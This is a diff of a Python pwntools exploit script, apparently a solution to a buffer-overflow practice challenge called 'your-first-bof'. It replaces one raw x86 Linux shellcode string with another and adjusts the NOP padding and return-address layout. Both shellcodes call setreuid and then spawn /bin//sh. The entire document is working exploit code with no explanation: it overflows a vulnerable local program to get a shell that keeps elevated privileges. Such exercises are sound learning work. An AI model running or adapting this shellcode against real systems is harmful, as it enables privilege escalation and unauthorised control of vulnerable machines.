@@ -1,9 +1,9 @@
 from pwn import *
 
-payload = b'\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
-#p = process("../your-first-bof/your-first-bof", stdin=PTY)
+payload = b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+p = process("../../your-first-bof/your-first-bof", stdin=PTY)
 
-p = process("./bof", stdin=PTY)
+#p = process("./bof", stdin=PTY)
 recv = p.recvuntil('>>> ').decode().split('\n')
 
 for line in recv:
@@ -22,7 +22,8 @@ print(len(payload[26:]))
 
 s1 = payload[:16]
 s2 = payload[16:32]
-s3 = payload[32:] + b'\x90'*5 + baddr
+#s3 = payload[32:] + b'\x90'*5 + baddr
+s3 = payload[32:]+b'\x90'*(28 - len(payload[32:])) + baddr
 
 print(len(s1), len(s2), len(s3), len(baddr))
 print(s1, '\n', s2, '\n', s3)
